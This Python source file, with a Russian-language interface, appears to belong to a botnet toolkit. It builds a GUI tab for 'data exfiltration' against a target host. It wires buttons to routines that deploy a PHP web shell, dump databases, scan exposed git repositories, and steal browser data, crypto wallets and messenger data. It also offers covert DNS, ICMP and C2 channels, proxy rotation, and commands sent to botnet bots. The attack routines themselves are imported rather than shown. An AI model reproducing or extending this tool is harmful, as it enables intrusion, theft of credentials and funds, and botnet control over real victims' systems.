import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading, time, asyncio, socket
from botnet.datagrabber import DataGrabber, LOOT_DIR
from gui.widgets import ToolTip, RightClickMenu

class ExfilTab:
    def __init__(self, notebook, app):
        self.app = app
        self.frame = ttk.Frame(notebook)
        notebook.add(self.frame, text="🎯 Захват")
        self.proxy_mgr = app.proxy_manager
        self.exfil_progress_var = tk.DoubleVar()
        self._exfil_running = False
        self._build_ui()
        self.app.logger.info("Вкладка Захвата инициализирована")

    def _build_ui(self):
        self.frame.columnconfigure(0, weight=1)
        self.frame.rowconfigure(0, weight=1)

        main = ttk.LabelFrame(self.frame, text="Эксфильтрация данных", padding=10)
        main.grid(row=0, column=0, sticky='nsew', padx=10, pady=5)

        # Цель и порт
        ttk.Label(main, text="Цель:").grid(row=0, column=0, sticky='w')
        self.exfil_target = ttk.Entry(main, width=30)
        self.exfil_target.grid(row=0, column=1, padx=5, sticky='we')
        ttk.Button(main, text="📋", width=3, command=lambda: self.exfil_target.insert(0, self.app.root.clipboard_get())).grid(row=0, column=2, padx=2)
        ToolTip(self.exfil_target, "IP-адрес или домен уязвимого хоста")
        ttk.Label(main, text="Порт:").grid(row=0, column=3, sticky='w')
        self.exfil_port = ttk.Entry(main, width=6)
        self.exfil_port.insert(0, "80")
        self.exfil_port.grid(row=0, column=4, padx=5)
        ttk.Button(main, text="🔍", width=3, command=self._scan_port).grid(row=0, column=5, padx=2)
        ToolTip(main.winfo_children()[-1], "Проверить, открыт ли порт")

        # Глубина рекурсии
        ttk.Label(main, text="Глубина:").grid(row=1, column=0, sticky='w')
        self.exfil_depth = ttk.Spinbox(main, from_=1, to=10, width=4)
        self.exfil_depth.set(2)
        self.exfil_depth.grid(row=1, column=1, sticky='w')

        # Скрытый канал
        ttk.Label(main, text="Канал:").grid(row=2, column=0, sticky='w')
        self.exfil_channel = tk.StringVar(value="http")
        ttk.Combobox(main, textvariable=self.exfil_channel, values=["http","dns","icmp","c2"], state='readonly', width=6).grid(row=2, column=1, sticky='w')
        ttk.Label(main, text="Хост/Домен:").grid(row=2, column=2, sticky='w')
        self.c2_host_entry = ttk.Entry(main, width=20)
        self.c2_host_entry.grid(row=2, column=3, columnspan=3, padx=5, sticky='we')

        # Прокси
        proxy_frame = ttk.LabelFrame(main, text="Прокси", padding=5)
        proxy_frame.grid(row=3, column=0, columnspan=6, sticky='ew', pady=5)
        self.custom_proxy_text = tk.Text(proxy_frame, height=3, width=60,
                                         bg='#2d2d2d' if self.app.bg=='#121212' else 'white',
                                         fg=self.app.fg)
        self.custom_proxy_text.pack()
        RightClickMenu(self.custom_proxy_text)
        self.proxy_mode_var = tk.StringVar(value="none")
        ttk.Radiobutton(proxy_frame, text="Без", variable=self.proxy_mode_var, value="none").pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(proxy_frame, text="Лучшие", variable=self.proxy_mode_var, value="best").pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(proxy_frame, text="Все", variable=self.proxy_mode_var, value="all").pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(proxy_frame, text="HTTP", variable=self.proxy_mode_var, value="http").pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(proxy_frame, text="SOCKS5", variable=self.proxy_mode_var, value="socks5").pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(proxy_frame, text="Свой", variable=self.proxy_mode_var, value="custom").pack(side=tk.LEFT, padx=5)

        # Прогресс
        self.exfil_progress = ttk.Progressbar(main, variable=self.exfil_progress_var, maximum=100, mode='determinate')
        self.exfil_progress.grid(row=4, column=0, columnspan=6, sticky='ew', padx=5, pady=5)

        # Кнопки
        btn_frame = ttk.Frame(main)
        btn_frame.grid(row=5, column=0, columnspan=6, pady=5)
        ttk.Button(btn_frame, text="🔍 Типовые файлы", command=lambda: self._start_exfil("common")).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="💣 Веб-шелл", command=lambda: self._start_exfil("shell")).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="🗃 Дамп БД", command=lambda: self._start_exfil("db")).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="📂 Git", command=lambda: self._start_exfil("git")).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="🧬 Глубокая зачистка", command=lambda: self._start_exfil("deep")).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="🍪 Браузеры", command=lambda: self._start_exfil("browser")).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="💰 Кошельки", command=lambda: self._start_exfil("wallet")).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="💬 Мессенджеры", command=lambda: self._start_exfil("messenger")).pack(side=tk.LEFT, padx=2)
        self.stop_btn = ttk.Button(btn_frame, text="⏹ Стоп", command=self._stop_exfil, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.RIGHT, padx=5)

        # Лог
        self.log = scrolledtext.ScrolledText(self.frame, height=15,
                                             bg='#121212' if self.app.theme=='dark' else 'white',
                                             fg='lime' if self.app.theme=='dark' else 'black')
        self.log.grid(row=1, column=0, sticky='nsew', padx=10, pady=5)
        self.log.tag_configure("success", foreground="green")
        self.log.tag_configure("error", foreground="red")
        self.log.tag_configure("info", foreground="cyan")

    def _get_proxy_list(self):
        mode = self.proxy_mode_var.get()
        if mode == "custom":
            custom = self.custom_proxy_text.get("1.0", tk.END).strip()
            if custom:
                return [line.strip() for line in custom.splitlines() if line.strip()]
        if self.proxy_mgr and self.proxy_mgr.proxies:
            if mode == "best":
                return self.proxy_mgr.get_best_proxies(50)
            elif mode == "all":
                return [f"{p['ip']}:{p['port']}" for p in self.proxy_mgr.proxies]
            elif mode == "http":
                return self.proxy_mgr.get_best_proxies(50, proxy_type='http')
            elif mode == "socks5":
                return self.proxy_mgr.get_best_proxies(50, proxy_type='socks5')
        return []

    def _scan_port(self):
        target = self.exfil_target.get().strip()
        port = int(self.exfil_port.get().strip() or '80')
        if not target:
            messagebox.showerror("Ошибка", "Введите цель")
            return
        try:
            s = socket.socket()
            s.settimeout(2)
            result = s.connect_ex((target, port))
            s.close()
            if result == 0:
                self.log.insert(tk.END, f"[i] Порт {port} открыт\n", "info")
            else:
                self.log.insert(tk.END, f"[!] Порт {port} закрыт\n", "error")
        except Exception as e:
            self.log.insert(tk.END, f"[!] Ошибка: {e}\n", "error")

    def _start_exfil(self, task):
        if self._exfil_running:
            messagebox.showinfo("Занято", "Дождитесь завершения текущей операции")
            return
        target = self.exfil_target.get().strip()
        port = int(self.exfil_port.get().strip() or '80')
        if not target:
            messagebox.showerror("Ошибка", "Введите цель")
            return
        self.exfil_progress_var.set(0)
        self._exfil_running = True
        self.stop_btn.config(state=tk.NORMAL)
        threading.Thread(target=self._run_exfil_task, args=(task, target, port), daemon=True).start()

    def _run_exfil_task(self, task, target, port):
        async def run():
            async with DataGrabber(log_func=lambda msg: self.log.insert(tk.END, msg)) as dg:
                if task == "common":
                    self.log.insert(tk.END, "[*] Сбор типовых файлов...\n", "info")
                    await dg.grab_common_files(target, port)
                elif task == "shell":
                    # Автоопределение сервера перед загрузкой шелла
                    server_type = await dg.detect_server(target, port)
                    self.log.insert(tk.END, f"[i] Сервер: {server_type}\n", "info")
                    if "apache" in server_type.lower() or "php" in server_type.lower():
                        self.log.insert(tk.END, "[*] Загрузка PHP-шелла...\n", "info")
                        await dg.deploy_web_shell(target, port)
                    else:
                        self.log.insert(tk.END, "[!] Веб-шелл недоступен для данного сервера\n", "error")
                elif task == "db":
                    self.log.insert(tk.END, "[*] Поиск конфигов БД...\n", "info")
                    await dg.dump_database_from_config(target, port)
                elif task == "git":
                    self.log.insert(tk.END, "[*] Сканирование Git...\n", "info")
                    await dg.scan_git_repository(target, port)
                elif task == "deep":
                    self.log.insert(tk.END, "[*] Глубокая зачистка...\n", "info")
                    await dg.deep_system_scan(target, port)
                elif task == "browser":
                    self.log.insert(tk.END, "[*] Сбор браузерных данных...\n", "info")
                    await dg.grab_browser_data(target, port)
                elif task == "wallet":
                    self.log.insert(tk.END, "[*] Поиск кошельков...\n", "info")
                    await dg.grab_crypto_wallets(target, port)
                elif task == "messenger":
                    self.log.insert(tk.END, "[*] Сбор мессенджеров...\n", "info")
                    await dg.grab_messenger_data(target, port)
                # Интеграция с C2: если выбран канал "c2", отправляем данные через C2
                if self.exfil_channel.get() == "c2" and hasattr(self.app, 'botnet_tab'):
                    c2 = self.app.botnet_tab.c2
                    if c2.running:
                        # Отправляем команду на ботов (пример: передать файл)
                        bots = list(c2.get_bots().keys())
                        if bots:
                            c2.launch_attack(target, "CFBUAM", 100, bots)  # заглушка
        try:
            asyncio.run(run())
        except Exception as e:
            self.log.insert(tk.END, f"[!] Ошибка: {e}\n", "error")
        finally:
            self._exfil_running = False
            self.frame.after(0, lambda: self.stop_btn.config(state=tk.DISABLED))
            self.frame.after(0, lambda: self.exfil_progress_var.set(100))

    def _stop_exfil(self):
        self._exfil_running = False
        self.log.insert(tk.END, "[!] Операция прервана пользователем\n", "info")
